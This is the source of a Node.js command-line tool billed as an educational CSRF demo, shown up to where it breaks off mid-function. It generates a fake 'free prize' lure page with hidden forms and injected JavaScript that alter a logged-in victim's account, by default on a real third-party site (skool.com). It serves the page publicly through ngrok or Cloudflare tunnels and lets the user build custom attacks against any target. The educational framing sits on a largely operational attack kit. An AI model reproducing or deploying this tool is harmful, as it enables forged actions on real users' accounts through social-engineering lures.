/**
 * ============================================================================
 * CSRF EDUCATIONAL DEMO - MANAGER CLI v5.0
 * ============================================================================
 * Fully integrated CSRF demonstration tool with:
 * - Built-in tunnel deployment (ngrok / cloudflared)
 * - Custom attack builder (define your own forms)
 * - JavaScript-based attacks for React/Next.js sites
 * - One-click setup
 *
 * Usage: node manager.js
 * ============================================================================
 */

const http = require('http');
const https = require('https');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// ============================================
// ANSI COLOR CODES - Sci-Fi Terminal Theme
// ============================================
const C = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
};

// ============================================
// CONFIGURATION
// ============================================
const CONFIG_FILE = path.join(__dirname, 'crf-config.json');
const DEFAULT_CONFIG = {
    targetUrl: 'https://www.skool.com',
    targetName: 'Skool',
    maliciousPort: 3001,
    customDomain: '',
    tunnel: 'cloudflared',
    attacks: [
        {
            id: 'attack-profile-bio',
            name: 'Update Profile Bio',
            type: 'javascript',
            method: 'POST',
            actionUrl: '/settings?t=profile',
            fields: [
                { name: 'bio', value: 'hehe boii' },
            ],
            enabled: true,
            jsConfig: {
                targetSelector: 'textarea[aria-label="Bio"]',
                newValue: 'hehe boii',
                submitSelector: 'button',
                submitDelay: 500,
            },
        },
    ],
};

let config = loadConfig();
let tunnelProcess = null;
let maliciousServer = null;

// ============================================
// CONFIG MANAGEMENT
// ============================================
function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
            return { ...DEFAULT_CONFIG, ...saved };
        }
    } catch (e) {
        log('warn', 'Could not load config, using defaults.');
    }
    return JSON.parse(JSON.stringify(DEFAULT_CONFIG));
}

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
    log('ok', 'Config saved to ' + CONFIG_FILE);
}

// ============================================
// UI HELPERS
// ============================================
function clearScreen() {
    process.stdout.write('\x1Bc');
}

function log(type, msg) {
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    const prefix = {
        info:    `${C.cyan}[${timestamp}]${C.reset} ${C.blue}[INFO]${C.reset}`,
        ok:      `${C.cyan}[${timestamp}]${C.reset} ${C.green}[ OK ]${C.reset}`,
        warn:    `${C.cyan}[${timestamp}]${C.reset} ${C.yellow}[WARN]${C.reset}`,
        error:   `${C.cyan}[${timestamp}]${C.reset} ${C.red}[FAIL]${C.reset}`,
        attack:  `${C.cyan}[${timestamp}]${C.reset} ${C.magenta}[ATK!]${C.reset}`,
        system:  `${C.cyan}[${timestamp}]${C.reset} ${C.white}[SYS ]${C.reset}`,
    }[type] || `[${type}]`;
    console.log(`  ${prefix} ${msg}`);
}

function printBanner() {
    console.log('');
    console.log(`${C.green}${C.bright}
  ██████╗███████╗██████╗ ███████╗
 ██╔════╝██╔════╝██╔══██╗██╔════╝
 ██║     ███████╗██████╔╝█████╗
 ██║     ╚════██║██╔══██╗██╔══╝
 ╚██████╗███████║██║  ██║██║
  ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.green}${C.bright}  CSRF${C.reset}${C.dim} // Cross-Site Request Forgery Demo Manager v5.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');
}

function printConfig() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TARGET CONFIG${C.reset}                                                ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target URL:      ${C.bright}${config.targetUrl}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target Name:     ${C.bright}${config.targetName}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Malicious Port:  ${C.bright}${config.maliciousPort}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Custom Domain:   ${C.bright}${config.customDomain || '(none)'}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Tunnel:          ${C.bright}${config.tunnel}${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}ATTACK MODULES${C.reset}                                              ${C.cyan}│${C.reset}`);
    config.attacks.forEach((attack, i) => {
        const status = attack.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
        const type = attack.type === 'javascript' ? 'JS' : 'FORM';
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${i + 1}]${C.reset} ${attack.name.padEnd(20)} ${status} ${C.dim}[${type}]${C.reset}`);
    });
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${config.attacks.length + 1}]${C.reset} ${C.bright}+ Add Custom Attack${C.reset}                                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

function printMenu() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}MAIN MENU${C.reset}                                                 ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} 🚀 One-Click Deploy (Server + Tunnel)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} 🎯 Configure Target URL                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ⚙️  Manage Attacks (Add/Edit/Remove)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} 🌐 Domain / Tunnel Setup                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} 📋 View Current Config                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[6]${C.reset} 💾 Save Config                                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[7]${C.reset} 📖 CSRF Theory (Educational)                      ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[8]${C.reset} 🛡️  Defense Mechanisms                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.red}[9]${C.reset} ❌ Terminate Session                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

// ============================================
// MALICIOUS SERVER
// ============================================
function generateMaliciousHTML() {
    const targetUrl = config.targetUrl.replace(/\/$/, '');
    const targetName = config.targetName;

    let attackFuncs = '';

    config.attacks.forEach((attack, i) => {
        if (!attack.enabled) return;

        if (attack.type === 'javascript') {
            const jsConfig = attack.jsConfig || {};
            attackFuncs += [
                `                    addLog('Submitting: ${attack.name}...');`,
                `                    addLog('  -> Type: JavaScript (React/Next.js)');`,
                `                    addLog('  -> Target: ${jsConfig.targetSelector || 'N/A'}');`,
                `                    addLog('  -> New Value: ${jsConfig.newValue || 'N/A'}');`,
                `                    addLog('  -> Submit: ${jsConfig.submitSelector || 'N/A'}');`,
                `                    jsAttack${i}();`
            ].join('\n');
        } else {
            const formId = 'csrf-attack-' + i;
            const fullUrl = attack.actionUrl.startsWith('http') 
                ? attack.actionUrl 
                : targetUrl + attack.actionUrl;

            attackFuncs += [
                "                    addLog('Submitting: " + attack.name + "...');",
                "                    addLog('  -> " + attack.method + " " + fullUrl + "');",
                "                    attackLogFields(" + i + ");",
                "                    addLog('  -> Cookies: [session cookie] (auto-attached!)');",
                "                    document.getElementById('" + formId + "').submit();"
            ].join('\n');
        }
    });

    // Generate JS attack functions
    let jsAttackFunctions = '';
    config.attacks.forEach((attack, i) => {
        if (!attack.enabled || attack.type !== 'javascript') return;
        
        const jsConfig = attack.jsConfig || {};
        const targetSelector = jsConfig.targetSelector || 'textarea';
        const newValue = jsConfig.newValue || '';
        const submitSelector = jsConfig.submitSelector || 'button';
        const submitDelay = jsConfig.submitDelay || 500;

        jsAttackFunctions += [
            `                function jsAttack${i}() {`,
            `                    setTimeout(() => {`,
            `                        const target = document.querySelector('${targetSelector}');`,
            `                        if (!target) {`,
            `                            addLog('  -> ERROR: Target not found: ${targetSelector}');`,
            `                            return;`,
            `                        }`,
            `                        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(`,
            `                            window.HTMLTextAreaElement.prototype, 'value'`,
            `                        ).set;`,
            `                        nativeInputValueSetter.call(target, '${newValue}');`,
            `                        target.dispatchEvent(new Event('input', { bubbles: true }));`,
            `                        target.dispatchEvent(new Event('change', { bubbles: true }));`,
            `                        addLog('  -> Value set to: ${newValue}');`,
            `                        setTimeout(() => {`,
            `                            const submitBtn = Array.from(document.querySelectorAll('${submitSelector}'))`,
            `                                .find(btn => btn.textContent.includes('Update Profile'));`,
            `                            if (submitBtn) {`,
            `                                submitBtn.disabled = false;`,
            `                                submitBtn.click();`,
            `                                addLog('  -> Submit button clicked!');`,
            `                                addLog('  -> Cookies: [session cookie] (auto-attached!)');`,
            `                            } else {`,
            `                                addLog('  -> ERROR: Submit button not found');`,
            `                            }`,
            `                        }, ${submitDelay});`,
            `                    }, 1000);`,
            `                }`,
            ``
        ].join('\n');
    });

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎉 ${targetName} - Special Offer!</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f0f8ff; }
                .prize { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin: 20px 0; }
                .prize h2 { font-size: 2em; margin: 10px 0; }
                .warning { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 5px; margin-top: 20px; }
                .attack-log { background: #1a1a2e; color: #00ff88; font-family: 'Courier New', monospace; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 0.9em; white-space: pre-wrap; }
                .btn { background: #ff6b6b; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 5px; cursor: pointer; margin: 10px; }
                .btn:hover { background: #ee5a5a; }
                .info-box { background: #e8f4f8; border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 5px 5px 0; }
            </style>
        </head>
        <body>
            <h1>🎉 Congratulations!</h1>
            <div class="prize">
                <h2>🎁 YOU WON A FREE PRIZE! 🎁</h2>
                <p>Click below to claim your reward!</p>
                <button class="btn" onclick="claimPrize()">CLAIM PRIZE</button>
            </div>
            <div class="info-box">
                <strong>🔗 Target:</strong> ${targetName} (${targetUrl})<br>
                <strong>🎯 Attacks configured:</strong> ${config.attacks.filter(a => a.enabled).length}
            </div>
            <div class="warning" id="edu-panel">
                <h3>🎓 EDUCATIONAL DEMO - What Just Happened?</h3>
                <ol>
                    <li>You were logged into <strong>${targetName}</strong> (${targetUrl})</li>
                    <li>You visited this <strong>malicious page</strong></li>
                    <li>This page contained <strong>hidden forms</strong> targeting ${targetName}</li>
                    <li>Your browser <strong>automatically attached</strong> your session cookie</li>
                    <li>${targetName} received the request with valid cookies and <strong>processed it!</strong></li>
                </ol>
            </div>
            <div class="attack-log" id="log"></div>
            <script>
                const log = document.getElementById('log');
                function addLog(msg) {
                    const time = new Date().toLocaleTimeString();
                    log.textContent += '[' + time + '] ' + msg + '\\n';
                }
                function attackLogFields(idx) {
                    const attacks = ${JSON.stringify(config.attacks)};
                    const fields = attacks[idx].fields;
                    fields.forEach(f => addLog('  -> ' + f.name + '=' + f.value));
                }
                ${jsAttackFunctions}
                addLog('=== CSRF ATTACK DEMONSTRATION ===');
                addLog('Target: ${targetUrl}');
                addLog('Malicious page loaded.');
                addLog('Victim has active session on target.');
                addLog('Preparing hidden forms...');
                addLog('');
                function claimPrize() {
                    addLog('User clicked "CLAIM PRIZE" button');
                    addLog('Triggering CSRF attack...');
                    addLog('');
                    document.getElementById('edu-panel').style.display = 'block';
                    ${attackFuncs}
                    addLog('');
                    addLog('=== ATTACK EXECUTED ===');
                    addLog('Check ${targetUrl} to see the damage!');
                }
            </script>
        </body>
        </html>
    `;
}

function startMaliciousServer() {
    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(generateMaliciousHTML());
    });

    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
            log('error', `Port ${config.maliciousPort} is already in use!`);
            log('info', 'Kill the process using that port or change the port in Option 2.');
            log('info', 'Run: netstat -ano | findstr :' + config.maliciousPort);
            log('info', 'Then: taskkill /PID <PID> /F');
        } else {
            log('error', 'Server error: ' + err.message);
        }
        process.exit(1);
    });

    server.listen(config.maliciousPort, () => {
        log('attack', 'Malicious server deployed!');
        log('info', `Local:    http://localhost:${config.maliciousPort}`);
    });

    return server;
}

// ============================================
// TUNNEL MANAGEMENT
// ============================================
async function startTunnel() {
    const ngrokPath = path.join(__dirname, 'ngrok', 'ngrok.exe');
    const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');

    if (config.tunnel === 'ngrok') {
        if (!fs.existsSync(ngrokPath)) {
            log('error', 'ngrok not found. Download it first or use cloudflared.');
            return null;
        }
        log('system', 'Starting ngrok tunnel...');
        tunnelProcess = spawn(ngrokPath, ['http', String(config.maliciousPort)], { stdio: 'pipe' });
    } else if (config.tunnel === 'cloudflared') {
        if (!fs.existsSync(cloudflaredPath)) {
            log('error', 'cloudflared not found. Downloading...');
            await downloadCloudflared();
        }
        log('system', 'Starting Cloudflare Tunnel...');
        tunnelProcess = spawn(cloudflaredPath, ['tunnel', '--url', 'http://localhost:' + config.maliciousPort], { stdio: 'pipe' });
    } else {
        log('info', 'No tunnel configured. Using localhost only.');
        return null;
    }

    return new Promise((resolve) => {
        let output = '';
        const timeout = setTimeout(() => {
            log('warn', 'Tunnel timeout - check if it started manually.');
            resolve(null);
        }, 30000);

        tunnelProcess.stdout.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.(ngrok\.io|trycloudflare\.com)/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });

        tunnelProcess.stderr.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.(ngrok\.io|trycloudflare\.com)/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });
    });
}

async function downloadCloudflared() {
    const url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe';
    const dest = path.join(__dirname, 'cloudflared.exe');
    
    log('system', 'Downloading cloudflared...');
    
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                log('ok', 'cloudflared downloaded!');
                resolve();
            });
        }).on('error', (err) => {
            fs.unlink(dest, () => {});
            reject(err);
        });
    });
}

function stopTunnel() {
    if (tunnelProcess) {
        tunnelProcess.kill();
        tunnelProcess = null;
        log('system', 'Tunnel stopped.');
    }
}

// ============================================
// MENU SYSTEM
// ============================================
async function mainMenu() {
    while (true) {
        clearScreen();
        printBanner();
        printConfig();
        printMenu();

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}CRF${C.reset}${C.green}]─[${C.reset}${C.bright}manager${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        switch (choice.trim()) {
            case '1':
                await oneClickDeploy();
                break;
            case '2':
                await configureTarget();
                break;
            case '3':
                await manageAttacks();
                break;
            case '4':
                await configureTunnel();
                break;
            case '5':
                clearScreen();
                printBanner();
                printConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '6':
                saveConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '7':
                showCSRFExplanation();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '8':
                showProtectionGuide();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '9':
                console.log(`\n  ${C.red}  ⚠️  Terminating session...${C.reset}`);
                stopTunnel();
                if (maliciousServer) maliciousServer.close();
                console.log(`  ${C.dim}  Stay ethical, stay legal.${C.reset}\n`);
                rl.close();
                process.exit(0);
            default:
                log('error', 'Invalid option selected.');
                await ask(`  ${C.dim}Press Enter to try again...${C.reset}`);
        }
    }
}

async function oneClickDeploy() {
    clearScreen();
    printBanner();
    log('system', 'Initiating one-click deployment...');
    console.log('');

    log('system', '[1/3] Starting malicious server...');
    maliciousServer = startMaliciousServer();
    await new Promise(r => setTimeout(r, 1000));

    log('system', '[2/3] Starting tunnel...');
    const tunnelUrl = await startTunnel();

    log('system', '[3/3] Deployment complete!');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.green}${C.bright}✅ DEPLOYMENT COMPLETE${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Local:    ${C.bright}http://localhost:${config.maliciousPort}${C.reset}                       ${C.cyan}│${C.reset}`);
    if (tunnelUrl) {
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Public:   ${C.bright}${tunnelUrl}${C.reset}                       ${C.cyan}│${C.reset}`);
    }
    if (config.customDomain) {
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Domain:   ${C.bright}https://${config.customDomain}${C.reset}                       ${C.cyan}│${C.reset}`);
    }
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.bright}TESTING PROTOCOL:${C.reset}                                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Open target site and authenticate                      ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}      ${C.dim}→ ${config.targetUrl}${C.reset}                       ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Open malicious site in SAME browser                    ${C.cyan}│${C.reset}`);
    if (tunnelUrl) {
        console.log(`  ${C.cyan}│${C.reset}      ${C.dim}→ ${tunnelUrl}${C.reset}                       ${C.cyan}│${C.reset}`);
    } else {
        console.log(`  ${C.cyan}│${C.reset}      ${C.dim}→ http://localhost:${config.maliciousPort}${C.reset}                       ${C.cyan}│${C.reset}`);
    }
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Click "CLAIM PRIZE" and observe the attack!              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}Press Enter to stop and return to menu${C.reset}                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    await ask('');
    stopTunnel();
    if (maliciousServer) {
        maliciousServer.close();
        maliciousServer = null;
    }
    log('system', 'Server stopped.');
    console.log('');
}

async function configureTarget() {
    clearScreen();
    printBanner();
    log('system', 'Loading target configuration...');
    console.log('');

    const newTarget = await ask(`  ${C.yellow}▸${C.reset} Target URL [${C.bright}${config.targetUrl}${C.reset}]: `);
    if (newTarget.trim()) {
        config.targetUrl = newTarget.trim().replace(/\/$/, '');
    }

    const newName = await ask(`  ${C.yellow}▸${C.reset} Target Name [${C.bright}${config.targetName}${C.reset}]: `);
    if (newName.trim()) {
        config.targetName = newName.trim();
    }

    const newPort = await ask(`  ${C.yellow}▸${C.reset} Malicious Port [${C.bright}${config.maliciousPort}${C.reset}]: `);
    if (newPort.trim() && !isNaN(parseInt(newPort))) {
        config.maliciousPort = parseInt(newPort.trim());
    }

    log('ok', 'Target configuration updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function manageAttacks() {
    while (true) {
        clearScreen();
        printBanner();
        log('system', 'Loading attack modules...');
        console.log('');

        console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}ATTACK MODULES${C.reset}                                         ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
        
        config.attacks.forEach((attack, i) => {
            const status = attack.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
            const type = attack.type === 'javascript' ? 'JS' : 'FORM';
            console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${attack.name.padEnd(20)} ${status} ${C.dim}[${type}]${C.reset}  ${C.cyan}│${C.reset}`);
        });
        
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.attacks.length + 1}]${C.reset} ${C.bright}+ Add Custom Attack${C.reset}                                    ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.attacks.length + 2}]${C.reset} ← Back to Main Menu                                 ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
        console.log('');

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}CRF${C.reset}${C.green}]─[${C.reset}${C.bright}attacks${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        const num = parseInt(choice.trim());
        
        if (num >= 1 && num <= config.attacks.length) {
            await editAttack(num - 1);
        } else if (num === config.attacks.length + 1) {
            await addAttack();
        } else if (num === config.attacks.length + 2) {
            return;
        } else {
            log('error', 'Invalid option.');
            await ask(`  ${C.dim}Press Enter to continue...${C.reset}`);
        }
    }
}

async function addAttack() {
    console.log('');
    log('system', 'Creating new attack module...');
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Attack Name: `);
    
    console.log('');
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}ATTACK TYPE${C.reset}                                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Form Attack (Traditional HTML forms)                ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} JavaScript Attack (React/Next.js/Angular)           ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const typeChoice = await ask(`  ${C.yellow}▸${C.reset} Select type: `);
    const type = typeChoice.trim() === '2' ? 'javascript' : 'form';

    if (type === 'javascript') {
        const targetSelector = await ask(`  ${C.yellow}▸${C.reset} CSS selector for target element (e.g., textarea[aria-label="Bio"]): `);
        const newValue = await ask(`  ${C.yellow}▸${C.reset} New value to set: `);
        const submitSelector = await ask(`  ${C.yellow}▸${C.reset} CSS selector for submit button (e.g., button): `);
        const submitDelay = await ask(`  ${C.yellow}▸${C.reset} Submit delay (ms) [500]: `);

        config.attacks.push({
            id: 'attack-' + Date.now(),
            name: name.trim() || 'JS Attack',
            type: 'javascript',
            method: 'POST',
            actionUrl: '',
            fields: [],
            enabled: true,
            jsConfig: {
                targetSelector: targetSelector.trim(),
                newValue: newValue.trim(),
                submitSelector: submitSelector.trim(),
                submitDelay: parseInt(submitDelay) || 500,
            },
        });
    } else {
        const method = (await ask(`  ${C.yellow}▸${C.reset} Method (GET/POST) [POST]: `)) || 'POST';
        const actionUrl = await ask(`  ${C.yellow}▸${C.reset} Action URL (e.g., /api/update): `);

        const fields = [];
        log('info', 'Add form fields (press Enter with empty name to finish):');
        
        while (true) {
            const fieldName = await ask(`  ${C.yellow}▸${C.reset} Field name (or Enter to finish): `);
            if (!fieldName.trim()) break;
            
            const fieldValue = await ask(`  ${C.yellow}▸${C.reset} Field value: `);
            fields.push({ name: fieldName.trim(), value: fieldValue.trim() });
        }

        config.attacks.push({
            id: 'attack-' + Date.now(),
            name: name.trim() || 'Form Attack',
            type: 'form',
            method: method.toUpperCase(),
            actionUrl: actionUrl.trim(),
            fields: fields,
            enabled: true,
        });
    }

    log('ok', 'Attack added!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function editAttack(index) {
    const attack = config.attacks[index];
    
    console.log('');
    log('system', 'Editing: ' + attack.name);
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Name [${attack.name}]: `);
    if (name.trim()) attack.name = name.trim();

    const enabled = await ask(`  ${C.yellow}▸${C.reset} Enabled? (y/n) [${attack.enabled ? 'y' : 'n'}]: `);
    if (enabled.trim().toLowerCase() === 'y') attack.enabled = true;
    if (enabled.trim().toLowerCase() === 'n') attack.enabled = false;

    if (attack.type === 'javascript') {
        const jsConfig = attack.jsConfig || {};
        const targetSelector = await ask(`  ${C.yellow}▸${C.reset} Target selector [${jsConfig.targetSelector || ''}]: `);
        if (targetSelector.trim()) jsConfig.targetSelector = targetSelector.trim();

        const newValue = await ask(`  ${C.yellow}▸${C.reset} New value [${jsConfig.newValue || ''}]: `);
        if (newValue.trim()) jsConfig.newValue = newValue.trim();

        const submitSelector = await ask(`  ${C.yellow}▸${C.reset} Submit selector [${jsConfig.submitSelector || ''}]: `);
        if (submitSelector.trim()) jsConfig.submitSelector = submitSelector.trim();

        attack.jsConfig = jsConfig;
    } else {
        const method = await ask(`  ${C.yellow}▸${C.reset} Method [${attack.method}]: `);
        if (method.trim()) attack.method = method.toUpperCase();

        const actionUrl = await ask(`  ${C.yellow}▸${C.reset} Action URL [${attack.actionUrl}]: `);
        if (actionUrl.trim()) attack.actionUrl = actionUrl.trim();

        log('info', 'Current fields:');
        attack.fields.forEach((f, i) => {
            console.log(`    ${i + 1}. ${f.name} = ${f.value}`);
        });
        
        const editFields = await ask(`  ${C.yellow}▸${C.reset} Edit fields? (y/n): `);
        if (editFields.trim().toLowerCase() === 'y') {
            attack.fields = [];
            while (true) {
                const fieldName = await ask(`  ${C.yellow}▸${C.reset} Field name (or Enter to finish): `);
                if (!fieldName.trim()) break;
                const fieldValue = await ask(`  ${C.yellow}▸${C.reset} Field value: `);
                attack.fields.push({ name: fieldName.trim(), value: fieldValue.trim() });
            }
        }
    }

    log('ok', 'Attack updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function configureTunnel() {
    clearScreen();
    printBanner();
    log('system', 'Loading tunnel configuration...');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TUNNEL CONFIGURATION${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Cloudflare Tunnel (No account needed)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} ngrok (Requires free account)                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Custom Domain (Your own domain)                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} No Tunnel (Localhost only)                        ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} ← Back to Main Menu                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}CRF${C.reset}${C.green}]─[${C.reset}${C.bright}tunnel${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

    switch (choice.trim()) {
        case '1':
            config.tunnel = 'cloudflared';
            log('ok', 'Cloudflare Tunnel selected.');
            break;
        case '2':
            config.tunnel = 'ngrok';
            log('ok', 'ngrok selected.');
            break;
        case '3':
            config.tunnel = 'custom';
            const domain = await ask(`  ${C.yellow}▸${C.reset} Enter your domain: `);
            if (domain.trim()) {
                config.customDomain = domain.trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
                log('ok', 'Custom domain set: ' + config.customDomain);
            }
            break;
        case '4':
            config.tunnel = 'none';
            log('ok', 'Tunnel disabled. Localhost only.');
            break;
